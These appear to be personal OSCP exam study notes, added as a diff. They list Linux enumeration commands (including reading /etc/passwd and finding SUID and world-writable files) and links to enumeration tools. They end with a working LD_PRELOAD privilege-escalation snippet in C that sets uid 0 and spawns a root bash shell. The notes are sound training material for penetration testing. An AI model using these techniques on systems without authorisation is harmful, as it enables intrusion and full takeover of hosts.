@@ -1,0 +1,93 @@
+Covered topics include:  
+Privilege escalation (Windows & Linux) and kernel exploits  
+Buffer overflow exploitation and custom shellcode development  
+Active Directory attacks, Kerberoasting, BloodHound analysis, and LLMNR poisoning  
+Web application security, SQL injection, and XSS exploitation  
+OSCP exam strategy, time management, and report writing tips  
+Essential pentesting tools: Nmap, Burp Suite, Metasploit, LinPEAS, WinPEAS, Chisel, and more  
+
+try THM
+1) Linux Privilege Escalation 
+2) Windows Privilege Escalation 
+3) Linux PricEsc Arena
+4) Windows Privesc Arena 
+5) RazorBlack 
+6) Enterprise
+
+Tunneling and Pivoting
+Study simple stack base buffer overflow 
+
+System Linux Enumeration Command
+hostname 
+uname -a           #kernel Information 
+/proc/version      #informatio on target system processer 
+/etc/issue         #operating system information 
+ps                 #process running 
+  ps -A            #all running processes
+  ps aux           #show process all users(a), display user that launched the process(u), process that are not attached to a terminal (x) 
+  ps axjf          #process tree
+env                #environmental variables 
+sudo -l            #list all commands your user can run 
+id                 #overview of users's user privilege level and group membership 
+/etc/passwd        #easy way to discover users
+history
+ifconfig 
+ip route 
+netstat 
+  netstat -s       # list network usage statistics by protocol
+  netstat -tp      # list connections with the service name and PID information.
+  netstat -a       # shows all listening ports and established connections
+
+Find files:
+  find . -name flag1.txt: find the file named “flag1.txt” in the current directory
+  find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
+  find / -type d -name config: find the directory named config under “/”
+  find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
+  find / -perm a=x: find executable files
+  find /home -user frank: find all files for user “frank” under “/home”
+  find / -mtime 10: find files that were modified in the last 10 days
+  find / -atime 10: find files that were accessed in the last 10 day
+  find / -cmin -60: find files changed within the last hour (60 minutes)
+  find / -amin -60: find files accesses within the last hour (60 minutes)
+  find / -size 50M: find files with a 50 MB size
+
+Why -type f 2>/dev/null
+- “find” command tends to generate errors which sometimes makes the output hard to read. 
+- to redirect errors to “/dev/null” and have a cleaner output (below).
+
+Folders and files that can be written to or executed from:
+
+find / -writable -type d 2>/dev/null : Find world-writeable folders
+find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
+find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
+find / -perm -o x -type d 2>/dev/null : Find world-executable folders
+find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit
+
+
+Automated Emumeration 
+LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+LinEnum: https://github.com/rebootuser/LinEnum
+LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+Linux Priv Checker: https://github.com/linted/linuxprivchecker
+
+Scenario 1
+Encounter LD_PRELOAD Environment for example: #env_keep+= LD_PRELOAD
+Steps
+1. Check for LD_PRELOAD (with the env_keep option)
+2. Write a simple C code compiled as a share object (.so extension) file
+  #include <stdio.h>
+  #include <sys/types.h>
+  #include <stdlib.h>
+
+  void _init() {
+  unsetenv("LD_PRELOAD");
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  }
+3. #gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+4. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
+Reference: LD_PRELOAD is function that allows any program to use shared libraries
+Reference: env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run
+Reference: https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
